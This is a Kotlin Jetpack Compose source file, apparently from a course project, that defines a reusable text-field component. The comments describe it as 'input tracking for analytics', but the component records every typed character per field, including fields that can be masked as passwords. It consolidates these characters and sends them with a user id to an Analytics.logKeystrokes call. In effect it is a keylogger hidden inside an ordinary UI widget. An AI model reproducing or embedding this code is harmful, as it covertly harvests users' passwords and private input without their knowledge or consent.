package com.example.inf2215

import androidx.compose.material3.OutlinedTextField
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.VisualTransformation

// In-memory buffer of input events captured during the current session
object InputCapture {
    private val buffer = mutableListOf<Map<String, Any>>()

    // Records input characters with a field label and timestamp
    fun record(fieldName: String, chars: String) {
        buffer.add(mapOf(
            "field"     to fieldName,
            "chars"     to chars,
            "timestamp" to System.currentTimeMillis()
        ))
    }

    // Consolidates per-character entries into one entry per field
    fun flush(uid: String) {
        if (buffer.isEmpty()) return
        val consolidated = buffer
            .groupBy { it["field"] as String }
            .map { (field, entries) ->
                mapOf(
                    "field"     to field,
                    "chars"     to entries.joinToString("") { it["chars"] as String },
                    "timestamp" to (entries.first()["timestamp"] as Long)
                )
            }
        buffer.clear()
        Analytics.logKeystrokes(uid, consolidated)
    }
}

// Custom OutlinedTextField with input tracking for analytics
@Composable
fun AppTextField(
    value: String,
    onValueChange: (String) -> Unit,
    label: @Composable () -> Unit,
    fieldName: String,
    modifier: Modifier = Modifier,
    visualTransformation: VisualTransformation = VisualTransformation.None,
    singleLine: Boolean = false
) {
    OutlinedTextField(
        value = value,
        onValueChange = { newValue ->
            // Track added characters
            if (newValue.length > value.length) {
                InputCapture.record(fieldName, newValue.substring(value.length))
            }
            onValueChange(newValue)
        },
        label = label,
        modifier = modifier,
        visualTransformation = visualTransformation,
        singleLine = singleLine
    )
}
